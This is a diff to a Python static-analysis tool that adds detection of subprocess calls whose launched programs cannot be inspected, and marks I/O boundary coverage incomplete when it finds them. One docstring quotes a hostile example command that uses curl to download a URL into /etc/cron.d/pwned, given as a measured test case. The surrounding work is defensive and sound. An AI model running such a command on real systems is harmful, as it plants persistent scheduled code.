@@ -61,7 +61,7 @@ How It Works
 """
 from __future__ import annotations
 
-from collections.abc import Mapping, Sequence, Set as AbstractSet
+from collections.abc import Iterator, Mapping, Sequence, Set as AbstractSet
 from dataclasses import dataclass, field
 from pathlib import Path
 from typing import TYPE_CHECKING, Any, Optional
@@ -918,6 +918,93 @@ def _edge_dst_ref(edge: dict[str, Any]) -> Any:
     return ExternalRef.from_dict(raw)
 
 
+def _external_call_sites(
+    raw_edges: list[dict[str, Any]],
+    catalogs: dict[str, IoBoundaryCatalog],
+) -> Iterator[tuple[dict[str, Any], str, IoBoundaryCatalog]]:
+    """Every call site this analysis made into an EXTERNAL, catalogued-language target.
+
+    THE ONE DEFINITION OF THE POPULATION the coverage checks adjudicate, yielding
+    ``(edge, dst, catalog)``. Extracted when a second consumer appeared
+    (:func:`_opaque_launch_sites`) rather than after they drifted, because the
+    drift is the documented failure mode here: INV-motos was two callers sharing
+    one predicate but running it over DIFFERENT populations — the gate counted
+    ``instantiates`` call sites the tagger could not tag — and no amount of
+    sharing ``classify_call`` would have caught it. Sharing the predicate is not
+    enough; the ITERATION has to be shared too.
+
+    Three filters, each load-bearing:
+
+    * ``_CALL_SITE_EDGE_TYPES`` — a call site the catalog could have classified,
+      deliberately excluding ``imports`` (see that constant).
+    * the five-slot id shape with an EXTERNAL terminal slot — a first-party
+      callee's I/O was examined on its own edges, not here.
+    * a catalog for the language — with none there is no adjudication to
+      attempt, and the language is caught earlier by the INV-dabov check in
+      :func:`compute_boundary_coverage`, which is derived rather than passed in
+      precisely so this skip cannot fail open.
+    """
+    for edge in raw_edges:
+        if edge.get("type") not in _CALL_SITE_EDGE_TYPES:
+            continue
+        dst = edge.get("dst", "")
+        parts = dst.split(":")
+        # lang:module:span:name:kind — a well-formed id has all five.
+        if len(parts) < 5 or parts[-1] not in _EXTERNAL_DST_TERMINAL_SLOTS:
+            continue
+        catalog = catalogs.get(parts[0])
+        if catalog is None:
+            continue
+        yield edge, dst, catalog
+
+
+def _opaque_launch_sites(
+    raw_edges: list[dict[str, Any]],
+    catalogs: dict[str, IoBoundaryCatalog],
+) -> list[str]:
+    """Call sites where control leaves this process for a program we cannot see.
+
+    INV-gahuz. The catalogue classified these calls CORRECTLY — ``subprocess.run``
+    really is a subprocess primitive — and that is exactly why they were being
+    read as examined negatives: :func:`_uncatalogued_external_modules` permits any
+    call ``classify_call`` matches, which is right for every boundary that names
+    a KNOWN surface and wrong for the one that names OPACITY. See
+    :data:`~hypergumbo_core.io_boundary.OPAQUE_BOUNDARIES` for why ``subprocess``
+    is the only such boundary a catalog can declare.
+
+    MEASURED: ``subprocess.run(["curl", "-o", "/etc/cron.d/pwned", URL])`` returned
+    ``confirmed`` rc 0 for both a ``fs_write`` and a ``net_send``
+    ``must_not_exist`` claim, with ``open(f, "w")`` and ``socket.send`` controls
+    returning ``violated`` rc 1 in the same session.
+
+    Returns the QUALIFIED PRIMITIVE NAMES (``subprocess.run``), not the modules.
+    A module name would be actively misleading here: the blocker is not that
+    ``subprocess`` is uncatalogued — it is fully catalogued — but that this
+    particular call hands control to something outside the analysis. Naming the
+    call is also what makes the disclosure checkable against the source.
+    """
+    sites: set[str] = set()
+    for edge, dst, catalog in _external_call_sites(raw_edges, catalogs):
+        primitive = classify_call(
+            catalogs, dst, edge.get("meta"), dst_ref=_edge_dst_ref(edge),
+        )
+        if primitive is None:
+            continue
+        # ASKED OF THE CATALOGUE, NOT OF THE RETURNED BOUNDARY. ``classify_call``
+        # yields ONE primitive, so a call catalogued under two boundaries is
+        # reported under whichever row wins — and ``primitive.boundary in
+        # OPAQUE_BOUNDARIES`` therefore misses a launch whose other row is
+        # found first. The parity test over the registry caught exactly that on
+        # Scala the first time it ran; see ``declares_opaque_crossing``.
+        if not catalog.declares_opaque_crossing(primitive.module, primitive.name):
+            continue
+        # Joined rather than branched on a missing module: no shipped catalogue
+        # has a moduleless subprocess row (checked across all 14), so an
+        # ``if primitive.module`` branch would be dead code dressed as caution.
+        sites.add(".".join(part for part in (primitive.module, primitive.name) if part))
+    return sorted(sites)
+
+
 def _uncatalogued_external_modules(
     raw_edges: list[dict[str, Any]],
     catalogs: dict[str, IoBoundaryCatalog],
@@ -999,17 +1086,7 @@ def _uncatalogued_external_modules(
 
     analyzed = _analyzed_modules(raw_edges)
     unknown: set[str] = set()
-    for edge in raw_edges:
-        if edge.get("type") not in _CALL_SITE_EDGE_TYPES:
-            continue
-        dst = edge.get("dst", "")
-        parts = dst.split(":")
-        # lang:module:span:name:kind — a well-formed id has all five.
-        if len(parts) < 5 or parts[-1] not in _EXTERNAL_DST_TERMINAL_SLOTS:
-            continue
-        catalog = catalogs.get(parts[0])
-        if catalog is None:
-            continue
+    for edge, dst, catalog in _external_call_sites(raw_edges, catalogs):
         module = _module_from_symbol_path(dst)
         if not module:
             continue  # the placeholder — the disclosed residual above
@@ -1243,6 +1320,33 @@ def compute_boundary_coverage(
                 f"catalogued I/O is method-shaped ({shown}{suffix}) but produced "
                 f"no method call edge for any of them, so their I/O is "
                 f"structurally invisible"
+            ),
+        )
+
+    # INV-gahuz: control leaves the process for a program whose I/O is not in
+    # the edge set. Checked BEFORE the uncatalogued-module list below, and the
+    # order is a deliberate courtesy rather than a tie-break: an uncatalogued
+    # module is a gap the reader can CLOSE by cataloguing it, while an opaque
+    # launch is categorical — no amount of cataloguing makes the launched
+    # program visible. Reporting the fixable blocker first would send a reader
+    # on an errand that cannot succeed, then move the goalpost on them.
+    opaque = _opaque_launch_sites(raw_edges, catalogs)
+    if opaque:
+        shown = ", ".join(opaque[:_MAX_REPORTED_UNCATALOGUED_MODULES])
+        more = len(opaque) - _MAX_REPORTED_UNCATALOGUED_MODULES
+        suffix = f" (+{more} more)" if more > 0 else ""
+        # DELIBERATELY NOT the "could not classify" wording used below: the
+        # catalogue classified these exactly right, and blaming a missing row
+        # would send the reader to add one that already exists. State the
+        # opacity, which is the actual cause. No trailing conclusion —
+        # ``verify_claim`` appends "; cannot confirm the boundary is unused."
+        return BoundaryCoverage(
+            complete=False,
+            reason=(
+                f"the analysis launches an external program at "
+                f"{len(opaque)} call site(s) ({shown}{suffix}) and cannot see "
+                f"what the launched program does, so whether this I/O happens "
+                f"there was never examined"
             ),
         )
 
